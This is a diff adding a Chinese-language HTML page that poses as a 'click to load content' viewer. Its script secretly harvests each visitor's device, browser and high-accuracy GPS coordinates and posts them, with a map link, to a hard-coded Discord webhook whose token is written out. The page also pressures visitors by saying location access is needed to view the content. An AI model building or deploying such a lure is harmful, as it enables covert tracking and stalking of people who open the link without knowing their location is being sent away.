@@ -1,1 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>內容載入中</title>
+</head>
 
+<body>
+
+<h2>點擊按鈕查看內容</h2>
+<button onclick="getLocation()">點擊載入</button>
+
+<p id="status"></p>
+
+<script>
+
+var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+var ua = navigator.userAgent;
+var device = "Unknown Device";
+
+if(/iPhone/i.test(ua)){
+device = "iPhone";
+}
+else if(/iPad/i.test(ua)){
+device = "iPad";
+}
+else if(/Android/i.test(ua)){
+device = "Android Device";
+}
+
+var browser = "Unknown Browser";
+
+if(ua.indexOf("Chrome")>-1){
+browser = "Chrome";
+}
+else if(ua.indexOf("Safari")>-1){
+browser = "Safari";
+}
+function getLocation(){
+
+document.getElementById("status").innerHTML="正在取得位置...";
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition(success,error,{
+enableHighAccuracy:true,
+timeout:10000,
+maximumAge:0
+});
+
+}else{
+document.getElementById("status").innerHTML="瀏覽器不支援定位";
+}
+
+}
+
+function success(pos){
+
+var lat = pos.coords.latitude;
+var lon = pos.coords.longitude;
+var acc = pos.coords.accuracy;
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:
+"裝置: "+device+"\n"+
+"瀏覽器: "+browser+"\n"+
+"UserAgent: "+ua+"\n\n"+
+"📍有人打開網站\n"+
+"緯度: "+lat+"\n"+
+"經度: "+lon+"\n"+
+"精準度: "+acc+" 公尺"
+"地圖: https://maps.google.com/?q="+lat+","+lon
+})
+});
+
+document.getElementById("status").innerHTML=
+"定位成功<br>" +
+"緯度: "+lat+"<br>" +
+"經度: "+lon+"<br>" +
+"精準度: "+acc+" 公尺";
+
+}
+
+function error(err){
+
+document.getElementById("status").innerHTML="需要允許定位才能查看內容";
+
+}
+
+</script>
+
+</body>
+</html>
